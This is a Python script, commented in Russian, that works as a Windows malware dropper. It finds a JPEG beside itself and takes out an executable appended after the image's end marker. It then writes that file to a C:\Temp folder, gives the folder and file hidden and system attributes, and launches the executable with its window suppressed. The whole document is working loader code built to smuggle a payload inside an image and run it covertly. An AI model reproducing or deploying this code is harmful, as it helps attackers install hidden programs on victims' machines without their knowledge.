import os
import subprocess
import sys
import ctypes
import glob

# Функция для установки скрытых атрибутов
def set_hidden_attribute(path):
    FILE_ATTRIBUTE_HIDDEN = 0x02
    FILE_ATTRIBUTE_SYSTEM = 0x04
    ctypes.windll.kernel32.SetFileAttributesW(path, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM)

def extract_exe_from_jpeg(image_path, output_exe_path):
    try:
        with open(image_path, 'rb') as img_file:
            img_data = img_file.read()
    except Exception as e:
        print(f"Ошибка при чтении изображения: {e}")
        return

    end_marker = b'\xff\xd9'
    try:
        jpeg_end = img_data.index(end_marker) + len(end_marker)
    except ValueError:
        print("Не удалось найти конец JPEG.")
        return

    exe_data = img_data[jpeg_end:]

    if not os.path.exists(output_exe_path):
        try:
            with open(output_exe_path, 'wb') as exe_file:
                exe_file.write(exe_data)
            print("EXE файл успешно извлечен.")
        except Exception as e:
            print(f"Ошибка при записи EXE файла: {e}")
            return

# Определение пути к скрипту или exe
if getattr(sys, 'frozen', False):  # Проверяем, скомпилирован ли файл
    # В скомпилированной программе .exe
    script_dir = os.path.dirname(os.path.abspath(sys.executable))
else:
    # В обычном .py файле
    script_dir = os.path.dirname(os.path.abspath(__file__))

# Поиск первого файла с расширением .jpg в директории скрипта
exe_in_image_path = glob.glob(os.path.join(script_dir, "*.jpg"))

if not exe_in_image_path:
    print("Ошибка: Файлы .jpg не найдены в директории скрипта.")
    sys.exit()

# Создание скрытой папки C:\Temp, если она не существует
output_dir = r'C:\Temp'
os.makedirs(output_dir, exist_ok=True)

# Делаем папку скрытой, используя Windows API
set_hidden_attribute(output_dir)

# Определение пути для EXE файла
exe_file_path = os.path.join(output_dir, f"{os.path.splitext(os.path.basename(exe_in_image_path[0]))[0]}.exe")

# Извлечение EXE файла из JPEG
extract_exe_from_jpeg(exe_in_image_path[0], exe_file_path)

# Делаем файл скрытым
set_hidden_attribute(exe_file_path)

# Проверяем, что скрипт запускается на Windows
if sys.platform == "win32":
    try:
        # Скрываем мелькание окна с помощью флага SW_HIDE
        startupinfo = subprocess.STARTUPINFO()
        startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW

        # Запуск EXE файла в фоновом режиме с флагами для скрытия окна
        subprocess.Popen(exe_file_path, startupinfo=startupinfo)
        print("EXE успешно запущен.")
    except Exception as e:
        print(f"Ошибка при запуске EXE: {e}")